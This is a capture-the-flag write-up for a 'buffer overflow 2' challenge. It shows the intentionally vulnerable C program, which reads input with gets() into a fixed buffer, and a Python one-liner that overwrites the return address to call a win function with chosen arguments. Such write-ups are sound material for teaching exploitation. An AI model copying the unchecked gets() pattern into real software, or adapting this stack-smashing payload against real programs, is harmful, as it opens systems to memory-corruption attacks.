buffer overflow 2 - Points: 250
===========

## Description

>Alright, this time you'll need to control some arguments. Can you get the flag from this program? 

## Hint:

> * Try using gdb to print out the stack once you write to it!

## Vulnerable Code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

## Useful Information

There is no check of the input length at :
> *   gets(buf);


## Exploit


**Making an error by overflowing the buf[BUFSIZE] and overwrite EIP with the win function and 2 parameters:**

Input : "A"*112+WIN_ADR+RET_ADR+ARG_1+ARG_2
> python -c 'print "A"*112+"\xcb\x85\x04\x08XXXX\xef\xbe\xad\xde\xde\xc0\xad\xde"'|./bf2      


